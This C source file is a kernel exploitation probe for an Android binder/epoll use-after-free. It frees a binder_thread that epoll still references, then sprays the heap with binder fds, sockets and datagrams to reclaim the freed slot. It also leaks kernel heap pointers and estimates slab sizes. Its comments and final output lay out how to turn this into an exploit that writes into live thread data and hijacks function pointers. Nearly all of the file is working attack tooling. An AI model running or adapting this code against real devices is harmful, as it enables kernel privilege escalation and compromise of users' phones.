/*
 * binder_self_spray.c — Use binder's OWN allocations to reclaim freed thread
 *
 * Key insight: if binder_thread is in a generic kmalloc cache, then OTHER
 * binder_thread allocations (from different processes/fds) CAN reclaim it.
 *
 * The spray doesn't need controlled DATA — it just needs to reclaim the slot.
 * Once reclaimed by a different binder_thread, the epoll's dangling reference
 * now points to a LIVE binder_thread from a different fd.
 *
 * Strategy:
 *   1. Open binder fd A, register with epoll
 *   2. BINDER_THREAD_EXIT on fd A — frees the thread
 *   3. Open many binder fds (B1..BN), each creates a new binder_thread
 *   4. One of them reclaims fd A's freed slot
 *   5. EPOLL_CTL_DEL on fd A now accesses the live thread from some Bi
 *   6. This causes cross-fd state confusion
 *
 * Also tests: socket buffer allocation (SO_SNDBUF/SO_RCVBUF) as spray,
 * and setsockopt IP_OPTIONS for small controlled allocations.
 *
 * Most importantly: measures the binder_thread SIZE empirically by
 * examining the wait_queue_head_t content after self-reclaim.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_self_spray binder_self_spray.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <stdint.h>
#include <pthread.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version {
    signed long protocol_version;
};

static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = sig; }

/*
 * Test 1: Binder self-reclaim
 * Open many binder fds after freeing one thread.
 * Each new binder fd's first ioctl creates a binder_thread.
 * If one of them reclaims the freed slot, our epoll ref
 * now points to a DIFFERENT live binder_thread.
 */
static void test_binder_self_reclaim(int n_spray) {
    printf("\n=== TEST: Binder self-reclaim (n=%d) ===\n", n_spray);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        /* Step 1: Open target binder + epoll */
        int target_fd = open("/dev/binder", O_RDWR);
        if (target_fd < 0) _exit(1);
        void *tmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, target_fd, 0);
        if (tmap == MAP_FAILED) { close(target_fd); _exit(1); }

        /* Force thread creation via BINDER_VERSION */
        struct binder_version ver;
        ioctl(target_fd, BINDER_VERSION, &ver);
        printf("  binder protocol: %ld\n", ver.protocol_version);

        uint64_t kptr_before = ((uint64_t *)tmap)[0];
        printf("  target kptr: 0x%016llx\n", (unsigned long long)kptr_before);

        /* Step 2: Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = target_fd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, target_fd, &ev);

        /* Step 3: Free the binder_thread */
        ioctl(target_fd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread FREED\n");

        /* Step 4: Spray — open many new binder fds */
        int spray_fds[256];
        void *spray_maps[256];
        int actual = 0;
        int i;
        for (i = 0; i < n_spray && i < 256; i++) {
            spray_fds[i] = open("/dev/binder", O_RDWR);
            if (spray_fds[i] < 0) break;
            spray_maps[i] = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, spray_fds[i], 0);
            if (spray_maps[i] == MAP_FAILED) {
                close(spray_fds[i]);
                break;
            }
            /* Force thread creation */
            struct binder_version v;
            ioctl(spray_fds[i], BINDER_VERSION, &v);
            actual++;
        }
        printf("  sprayed %d new binder fds\n", actual);

        /* Step 5: Check if target's kptr changed */
        uint64_t kptr_after = ((uint64_t *)tmap)[0];
        printf("  target kptr after spray: 0x%016llx", (unsigned long long)kptr_after);
        if (kptr_after != kptr_before) printf(" *** CHANGED ***");
        printf("\n");

        /* Step 6: Try epoll operations on the target */
        got_signal = 0;
        errno = 0;
        ev.events = EPOLLIN | EPOLLOUT;
        int mod_ret = epoll_ctl(epfd, EPOLL_CTL_MOD, target_fd, &ev);
        printf("  EPOLL_CTL_MOD: ret=%d errno=%d", mod_ret, errno);
        if (got_signal) printf(" SIGNAL=%d", got_signal);
        printf("\n");

        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, target_fd, &ev);
        printf("  EPOLL_CTL_DEL: ret=%d errno=%d", del_ret, errno);
        if (got_signal) printf(" SIGNAL=%d", got_signal);
        printf("\n");

        /* Check for kernel pointers in spray mmap regions */
        printf("  Checking spray fd kptrs:\n");
        int unique_kptrs = 0;
        uint64_t seen[256];
        int nseen = 0;
        for (i = 0; i < actual; i++) {
            uint64_t k = ((uint64_t *)spray_maps[i])[0];
            if (k >= 0xffffffc000000000ULL) {
                int dup = 0;
                int j;
                for (j = 0; j < nseen; j++) {
                    if (seen[j] == k) { dup = 1; break; }
                }
                if (!dup && nseen < 256) {
                    seen[nseen++] = k;
                    unique_kptrs++;
                    if (unique_kptrs <= 5)
                        printf("    spray[%d] kptr: 0x%016llx\n", i, (unsigned long long)k);
                }
            }
        }
        printf("  %d unique kernel pointers across %d fds\n", unique_kptrs, actual);

        /* Cleanup */
        for (i = 0; i < actual; i++) {
            munmap(spray_maps[i], 4096);
            close(spray_fds[i]);
        }
        close(epfd);
        munmap(tmap, 4096);
        close(target_fd);

        if (got_signal) _exit(42);
        _exit(0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> SELF-RECLAIM SIGNAL DETECTED <<<\n");
        else printf("  exit=%d\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

/*
 * Test 2: Pipe-based writev with binder self-spray
 * Instead of using iovecs to spray, use new binder_threads.
 * Then use writev+readv on a pipe to PROBE the reclaimed data.
 *
 * Key idea: After self-reclaim, we can read the live binder_thread's
 * data through the pipe UAF. This gives us:
 *   - The exact layout of binder_thread on this kernel
 *   - Kernel code/data pointers in the thread structure
 *   - Information needed for function pointer hijack
 */
static void test_writev_after_self_spray(void) {
    printf("\n=== TEST: writev data leak after self-spray ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        /* Open target binder */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct binder_version ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        /* Setup epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Self-spray: open 128 new binder fds */
        int spray_fds[128];
        int actual = 0;
        int i;
        for (i = 0; i < 128; i++) {
            spray_fds[i] = open("/dev/binder", O_RDWR);
            if (spray_fds[i] < 0) break;
            void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, spray_fds[i], 0);
            if (m == MAP_FAILED) { close(spray_fds[i]); break; }
            munmap(m, 4096);
            struct binder_version v;
            ioctl(spray_fds[i], BINDER_VERSION, &v);
            actual++;
        }
        printf("  self-sprayed %d binder fds\n", actual);

        /* Now try the P0 writev technique.
         * Even though iovecs go to usercopy-kmalloc-*,
         * what we want is for the EPOLL_CTL_DEL to trigger
         * list_del which WRITES to our iovec kernel copy.
         *
         * Wait — the issue is that list_del writes to the
         * addresses IN the wait_queue, which is now a live
         * binder_thread. The list_del writes to:
         *   thread+0x50 (task_list.next)
         *   thread+0x58 (task_list.prev)
         * These contain pointers to eppoll_entry->wait.task_list.
         *
         * So list_del corrupts the live binder_thread — this
         * could crash or could be harmless depending on what
         * fields are at +0x50 and +0x58.
         */

        /* Actually, let's just check: does EPOLL_CTL_DEL
         * on the freed-then-reused thread cause observable effects? */
        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL after self-spray: ret=%d errno=%d", del_ret, errno);
        if (got_signal) printf(" SIGNAL=%d", got_signal);
        printf("\n");

        /* Try to use the spray binder fds to see if any are corrupted */
        int corrupted = 0;
        for (i = 0; i < actual; i++) {
            struct binder_version v;
            errno = 0;
            int r = ioctl(spray_fds[i], BINDER_VERSION, &v);
            if (r < 0 || v.protocol_version != ver.protocol_version) {
                printf("  spray_fd[%d] BINDER_VERSION: ret=%d proto=%ld (expected %ld) errno=%d\n",
                       i, r, v.protocol_version, ver.protocol_version, errno);
                corrupted++;
            }
        }
        printf("  %d/%d spray fds show unexpected behavior\n", corrupted, actual);

        /* Cleanup */
        for (i = 0; i < actual; i++) close(spray_fds[i]);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);

        if (got_signal || corrupted > 0) _exit(42);
        _exit(0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> SELF-SPRAY CORRUPTION DETECTED <<<\n");
        else printf("  exit=%d\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d — kernel corruption!\n", WTERMSIG(status));
    }
}

/*
 * Test 3: Use ioctl BINDER_WRITE_READ on the SAME fd after free.
 * This forces the kernel to look up the binder_thread again.
 * If the freed memory was reused (by self-spray), the kernel
 * now accesses whatever reclaimed the slot.
 */
static void test_ioctl_after_free(void) {
    printf("\n=== TEST: BINDER_WRITE_READ after free ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);

        struct binder_version ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        /* Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread freed\n");

        /* Now try BINDER_WRITE_READ — this creates a NEW thread */
        char wbuf[64], rbuf[64];
        memset(wbuf, 0, sizeof(wbuf));
        memset(rbuf, 0, sizeof(rbuf));
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = 0;
        bwr.write_buffer = (unsigned long)wbuf;
        bwr.read_size = sizeof(rbuf);
        bwr.read_buffer = (unsigned long)rbuf;

        got_signal = 0;
        errno = 0;
        /* This should create a new binder_thread for the current thread */
        int ret = ioctl(bfd, BINDER_WRITE_READ, &bwr);
        printf("  BINDER_WRITE_READ after free: ret=%d errno=%d", ret, errno);
        if (got_signal) printf(" SIGNAL=%d", got_signal);
        printf("\n");

        /* The key question: does the new thread REUSE the freed slot?
         * If so, the binder itself has self-reclaimed. */

        /* Now test: second BINDER_THREAD_EXIT + new ioctl */
        if (ret == 0 || errno == EAGAIN) {
            /* We got a new thread. Free it again. */
            ioctl(bfd, BINDER_THREAD_EXIT, NULL);

            /* Open many fds to spray */
            int spray_fds[64];
            int ns = 0;
            int i;
            for (i = 0; i < 64; i++) {
                spray_fds[i] = open("/dev/binder", O_RDWR);
                if (spray_fds[i] < 0) break;
                void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, spray_fds[i], 0);
                if (m != MAP_FAILED) {
                    struct binder_version v;
                    ioctl(spray_fds[i], BINDER_VERSION, &v);
                    munmap(m, 4096);
                }
                ns++;
            }

            /* Now try BINDER_WRITE_READ on original fd again */
            memset(&bwr, 0, sizeof(bwr));
            bwr.read_size = sizeof(rbuf);
            bwr.read_buffer = (unsigned long)rbuf;

            got_signal = 0;
            errno = 0;
            ret = ioctl(bfd, BINDER_WRITE_READ, &bwr);
            printf("  BINDER_WRITE_READ after re-free + spray(%d): ret=%d errno=%d",
                   ns, ret, errno);
            if (got_signal) printf(" SIGNAL=%d", got_signal);
            printf("\n");

            for (i = 0; i < ns; i++) close(spray_fds[i]);
        }

        close(bfd);
        if (got_signal) _exit(42);
        _exit(0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> CORRUPTION DETECTED <<<\n");
        else printf("  exit=%d\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

/*
 * Test 4: Determine binder_thread size empirically.
 * Open binder, read mmap kptr, close binder.
 * The kptr is the binder_proc address in kernel heap.
 * Open another binder, check its kptr distance from the first.
 * If they're in the same slab page, the distance tells us object size.
 */
static void test_thread_size_probe(void) {
    printf("\n=== TEST: binder_thread size estimation ===\n");

    uint64_t kptrs[64];
    int count = 0;
    int i;

    for (i = 0; i < 64; i++) {
        int fd = open("/dev/binder", O_RDWR);
        if (fd < 0) break;
        void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
        if (m == MAP_FAILED) { close(fd); break; }

        struct binder_version ver;
        ioctl(fd, BINDER_VERSION, &ver);

        kptrs[count] = ((uint64_t *)m)[0];
        count++;

        munmap(m, 4096);
        close(fd);
    }

    printf("  collected %d binder mmap kptrs\n", count);

    /* Sort kptrs */
    int j;
    for (i = 0; i < count - 1; i++) {
        for (j = i + 1; j < count; j++) {
            if (kptrs[j] < kptrs[i]) {
                uint64_t tmp = kptrs[i];
                kptrs[i] = kptrs[j];
                kptrs[j] = tmp;
            }
        }
    }

    /* Print sorted pointers and deltas */
    printf("  Sorted kptrs and deltas:\n");
    int deltas[64];
    int ndelta = 0;
    for (i = 0; i < count; i++) {
        int64_t delta = (i > 0) ? (int64_t)(kptrs[i] - kptrs[i-1]) : 0;
        if (i < 20 || delta > 0) {
            printf("    [%2d] 0x%016llx", i, (unsigned long long)kptrs[i]);
            if (i > 0) printf("  delta=%lld (0x%llx)", (long long)delta, (unsigned long long)delta);
            printf("\n");
        }
        if (i > 0 && delta > 0 && delta < 4096) {
            deltas[ndelta++] = (int)delta;
        }
    }

    /* Find most common delta — this is likely the slab object size */
    if (ndelta > 0) {
        printf("\n  Small deltas (<4096): ");
        for (i = 0; i < ndelta; i++) printf("%d ", deltas[i]);
        printf("\n");

        /* Mode */
        int best = deltas[0], best_count = 1;
        for (i = 0; i < ndelta; i++) {
            int cnt = 0;
            for (j = 0; j < ndelta; j++) {
                if (deltas[j] == deltas[i]) cnt++;
            }
            if (cnt > best_count) {
                best = deltas[i];
                best_count = cnt;
            }
        }
        printf("  Most common delta: %d (0x%x) — appears %d times\n",
               best, best, best_count);
        printf("  This is likely binder_proc object size (NOT binder_thread)\n");
        printf("  binder_proc → kmalloc-%d\n",
               best <= 64 ? 64 : best <= 128 ? 128 :
               best <= 192 ? 192 : best <= 256 ? 256 :
               best <= 512 ? 512 : best <= 1024 ? 1024 : 2048);
    }
}

/*
 * Test 5: Kernel stack spray via clone/fork
 * Each new process/thread gets a kernel stack allocation.
 * If we rapidly fork after freeing binder_thread, the kernel
 * stack pages might overlap with the freed slab object.
 * This is unlikely but worth testing.
 */
static void test_socket_buffer_spray(void) {
    printf("\n=== TEST: Socket buffer spray ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        struct binder_version ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Socket buffer spray: create many sockets and set buffer sizes */
        int socks[256];
        int ns = 0;
        int i;
        for (i = 0; i < 256; i++) {
            socks[i] = socket(AF_UNIX, SOCK_STREAM, 0);
            if (socks[i] < 0) break;

            /* The socket struct itself is in a dedicated cache,
             * but SO_SNDBUF/SO_RCVBUF changes internal allocations */
            int bufsize = 512;  /* Try to match binder_thread cache */
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
            ns++;
        }
        printf("  created %d sockets\n", ns);

        /* Also spray with sendmsg to connected sockets */
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) == 0) {
            /* Send many datagrams — each creates an sk_buff */
            char buf[256];
            memset(buf, 0, sizeof(buf));
            /* Put useful data at waitqueue offset */
            uint32_t zero = 0;
            memcpy(buf + 0x48, &zero, 4);  /* spinlock = 0 */

            int sent = 0;
            for (i = 0; i < 512; i++) {
                if (send(sv[0], buf, sizeof(buf), MSG_DONTWAIT) > 0)
                    sent++;
                else break;
            }
            printf("  sent %d datagrams\n", sent);

            /* Also try recvmsg to drain — the sk_buff stays until received */
        }

        got_signal = 0;
        ev.events = EPOLLIN | EPOLLOUT;
        epoll_ctl(epfd, EPOLL_CTL_MOD, bfd, &ev);
        if (got_signal) printf("  SIGNAL %d on MOD!\n", got_signal);

        got_signal = 0;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        if (got_signal) printf("  SIGNAL %d on DEL!\n", got_signal);

        printf("  epoll ops: %s\n", got_signal ? "SIGNAL" : "clean");

        for (i = 0; i < ns; i++) close(socks[i]);
        close(epfd);
        close(bfd);
        _exit(got_signal ? 42 : 0);
    }

    alarm(15);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 42)
        printf("  >>> SOCKET SPRAY RECLAIM! <<<\n");
    else if (WIFSIGNALED(status))
        printf("  killed by signal %d\n", WTERMSIG(status));
    else
        printf("  no reclaim\n");
}

int main(void) {
    printf("=== BINDER SELF-SPRAY & SIZE PROBE ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* First: estimate binder_proc (and indirectly thread) sizes */
    test_thread_size_probe();

    /* Test self-reclaim with different counts */
    test_binder_self_reclaim(32);
    test_binder_self_reclaim(64);
    test_binder_self_reclaim(128);

    /* Test writev-based leak after self-spray */
    test_writev_after_self_spray();

    /* Test ioctl after free */
    test_ioctl_after_free();

    /* Test socket buffer spray */
    test_socket_buffer_spray();

    printf("\n=== PROBE COMPLETE ===\n");
    printf("Key question: does binder self-reclaim work?\n");
    printf("If yes: we can use binder_thread objects themselves as spray.\n");
    printf("The exploit becomes: free thread A, spray with thread B-N,\n");
    printf("then use epoll UAF to write to thread B's data.\n");
    return 0;
}
